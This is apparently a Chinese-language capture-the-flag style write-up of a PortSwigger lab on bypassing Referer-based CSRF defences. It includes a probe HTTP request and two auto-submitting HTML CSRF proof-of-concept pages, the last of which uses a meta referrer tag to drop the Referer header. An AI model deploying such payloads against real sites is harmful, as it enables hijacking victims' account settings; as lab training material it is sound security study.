# 实验：Referer 验证依赖于 Header 是否存在的 CSRF 漏洞

https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

本实验的邮箱修改功能易受 CSRF 攻击。它试图阻止跨域请求，但存在一个不安全的回退机制（fallback）。

为了解决本实验，请使用你的漏洞利用服务器（exploit server）托管一个 HTML 页面，该页面利用 CSRF 攻击修改查看者的邮箱地址。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
> 你无法注册已被其他用户使用的邮箱地址。如果在测试利用程序时更改了自己的邮箱地址，请确保在向受害者交付最终利用程序时使用另一个不同的邮箱地址。

## 步骤

探测
- 使用修改邮件功能
    ```http
    POST /my-account/change-email HTTP/2
    Host: lab-id.web-security-academy.net
    Cookie: session=m74kQy3JqfMfkO2OUhydjJoIa0D7U6uu
    Origin: https://lab-id.web-security-academy.net
    Referer: https://lab-id.web-security-academy.net/my-account?id=wiener

    email=a%40b
    ```
    - 无 csrf 令牌

- 尝试移除 Referer 头部
    - 成功
    

攻击
- 使用 burp csrf poc 对修改邮件请求进行构造
    ```html
    <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
        <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="ccc&#64;b" />
        <input type="submit" value="Submit request" />
        </form>
        <script>
        history.pushState('', '', '/');
        document.forms[0].submit();
        </script>
    </body>
    </html>
    ```
- 设置无 `referrer` HTML `meta` 属性，构造最终载荷
    ```html
    <html>
        <meta name="referrer" content="never">
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
        <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="ccc&#64;b" />
        <input type="submit" value="Submit request" />
        </form>
        <script>
        history.pushState('', '', '/');
        document.forms[0].submit();
        </script>
    </body>
    </html>
    ```
